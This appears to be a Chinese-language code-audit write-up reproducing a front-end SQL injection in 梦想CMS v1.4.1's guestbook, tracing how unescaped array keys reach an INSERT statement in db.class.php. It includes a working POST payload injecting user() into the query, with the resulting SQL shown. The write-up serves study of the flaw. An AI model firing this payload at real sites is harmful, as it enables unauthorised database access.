# 梦想CMS 前台SQL注入

- [梦想CMS 前台SQL注入](#梦想cms-前台sql注入)
  - [漏洞要求](#漏洞要求)
  - [漏洞分析](#漏洞分析)
  - [漏洞测试](#漏洞测试)
  - [小结](#小结)
  - [相关链接](#相关链接)

v1.4.1版本的源码放在当前目录下，防止后面的漏洞找不到源代码

## 漏洞要求

- 版本：v1.4.1

## 漏洞分析

这篇文章是根据 <https://xz.aliyun.com/t/11224> 这个师傅的文章进行的漏洞复现，所以直接看漏洞点，这个前台的SQL注入点还是挺有意思的，在学习完SQl注入之后，可以通过这个漏洞点进行很好的学习。

漏洞点在前台的留言版，看到这个地方，刚学习漏洞的可能更容易想到的是`xss`, 不过这里的是一个SQL注入
根据抓包知道保存留言时请求的url是`/index.php?m=Book&a=setBook`，该请求对应的代码文件为 `c/index/BookAction.class.php` 的如下部分：

```php
public function index(){
      if(isset($_POST['setbook'])){//提交留言
          $data = $this->checkData();
          if($this->bookModel->add($data)){
              $this->setBookTime(); //存储提交时间
              rewrite::succ($this->l['book_ok']);
          }else{
              rewrite::error($this->l['book_error']);
          }
      }
      //判断是否调用留言数据
      if($GLOBALS['public']['isbookdata']){
              //判断是否只调用审核
              $where = '';
              if($GLOBALS['public']['bookDisplay']) $where = 'ischeck=1';
              $count = $this->bookModel->count($where);
              $page = new page($count,$GLOBALS['public']['booknum']);
              $data = $this->bookModel->getData($page->returnLimit(),$where);
              $this->smarty->assign('list',$data);
              $this->smarty->assign('num',$count);
              $this->smarty->assign('page',$page->html());
      }
      $this->smarty->display('book/index.html');
  }
```

在代码中`$data = $this->checkData();` 调用 `checkData()` 对请求的数据进行检查处理，过滤xss,sql 注入，以及对提交的间隔做限制，接着是调用 `$this->bookModel->add($data)` 进行数据的存储入库。

继续看代码调用到 `m/BookModel.class.php` 如下代码：

```php
//前台增加留言
public function add($data){
    $data['time'] = time();
    return parent::addModel($data);
}
```

以及代码文件 `class/Model.class.php` 的如下代码：

```php
//增加数据并返回id
protected function addModel($data){
    return parent::addDB($this->tab[0],$data);
}
```

最终调用到代码文件  `class/db.class.php` 的如下部分：

```php
//增加
protected function addDB($tab,$data){
    foreach($data as $key=>$v){
        $field[]=$key;
        $value[]="'$v'";
    }
    $field = implode(',',$field);
    $value = implode(",",$value);
    $sql="INSERT INTO ".DB_PRE."$tab($field) VALUES($value)";
    $this->query($sql);
    return mysql_insert_id();
}
```

而漏洞的问题也处在最后的这个 `addDB` 方法上，这里的SQL 拼接是传入的数组data循环，所有的数据库字段追加到 `$field` 数组中，所有的 插入的值追加到 `$value` 数组中，两者都通过 `implode` 方法将数组转换
以逗号分隔的字符串，并最终拼接到 `$sql` 变量中。 `$field[]=$key;` 对于 字段名的拼接并没有做任何处理，所以我们可以在这个地方进行注入。

## 漏洞测试

我们在保存的浏览的请求数据中，将数据内容改为如下：
`name=%E5%95%8A%E5%95%8A%E5%95%8A&mail=aa%40qq.com&tel=121111&content=2323&setbook=%E6%8F%90%E4%BA%A4&time,ischeck)VALUES(user(),1,1,1,1,1,1);#=1`

其实就是在你抓住的数据包的后面添加 `&time,ischeck)VALUES(user(),1,1,1,1,1,1);#=1`内容将原本拼接到后面的SQL给注释掉了，我们调试打印 `$sql="INSERT INTO ".DB_PRE."$tab($field) VALUES($value)";` 可以看到如下内容：

`INSERT INTO lmx_book(name,content,mail,tel,ip,time,ischeck)VALUES(user(),1,1,1,1,1,1);#,time) VALUES('啊啊啊','2323','aa@qq.com','121111','192.168.80.1','1','1657690699')`

在留言板上看你的留言即可以在用户名那里看到的数据库用户名

## 小结

这个代码作为SQL注入学习以及代码审计的入门都是一个不错的小练习。

## 相关链接

- <https://xz.aliyun.com/t/11224>
- <http://www.lmxcms.com/down/xitong/20210530/14.html>
